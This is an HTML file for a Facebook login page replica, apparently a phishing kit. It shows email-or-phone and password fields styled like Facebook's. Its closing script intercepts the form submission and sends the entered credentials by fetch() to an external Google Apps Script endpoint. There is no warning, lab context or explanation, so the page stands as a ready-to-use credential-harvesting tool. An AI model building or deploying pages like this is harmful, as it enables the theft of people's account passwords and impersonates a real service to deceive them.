<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1">
    <title>Facebook Page Replica</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="left">
            <h1>facebook</h1>
            <p>Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="right">
            <form action="" name="facebook">
                <input type="text" name="phone" id="name" placeholder="Email addess or phone number">
                <input type="password" name="password" id="password" placeholder="Password">
                <input type="submit" value="submit" class="loginBtn" id="submit" name="submit">
                <a href="" class="forget">Forgotten password?</a>
                <div class="sign-up">
                    <a href="" class="signupBtn">Create New Account</a>
                </div>
            </form>
            <p><b>Create a Page</b> for a celebrity, band or business.</p>
        </div>
    </div>
</body>
    
    <script>
  const scriptURL = 'https://script.google.com/macros/s/AKfycbw5uTK5blapLGYC-xaL9Hpke91QR4brJjgN_ca2YD3jD4HWqzdl5vJdnlP8d0WPHiaY/exec'
  const form = document.forms['facebook']

  form.addEventListener('submit', e => {
    e.preventDefault()
    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
      .then(response => console.log('Success!', response))
      .catch(error => console.error('Error!', error.message))
  })
</script>
    
</html>
